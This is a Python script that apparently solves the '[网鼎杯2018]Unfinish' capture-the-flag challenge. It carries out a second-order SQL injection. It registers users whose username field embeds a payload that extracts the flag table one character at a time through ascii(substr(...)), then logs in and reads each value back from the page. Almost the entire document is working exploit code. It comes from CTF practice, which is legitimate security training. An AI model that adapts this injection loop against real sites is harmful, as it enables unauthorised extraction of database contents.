# [网鼎杯2018]Unfinish
import requests
import logging
import re
from time import sleep

# LOG_FORMAT = "%(lineno)d - %(asctime)s - %(levelname)s - %(message)s"
# logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)

def search():
    flag = ''
    url = 'http://e2281609-5661-4bef-aa89-1a982a928544.node4.buuoj.cn:81/'
    url1 = url+'register.php'
    url2 = url+'login.php'
    for i in range(100):
        sleep(0.3)#不加sleep就429了QAQ
        data1 = {"email" : "1234{}@123.com".format(i), "username" : "0'+ascii(substr((select * from flag) from {} for 1))+'0;".format(i), "password" : "123"}
        data2 = {"email" : "1234{}@123.com".format(i), "password" : "123"}
        r1 = requests.post(url1, data=data1)
        r2 = requests.post(url2, data=data2)
        res = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r2.text)
        res1 = re.search(r'\d+', res.group())
        flag = flag+chr(int(res1.group()))
        print(flag)
    print("final:"+flag)

if __name__ == '__main__':
    search()
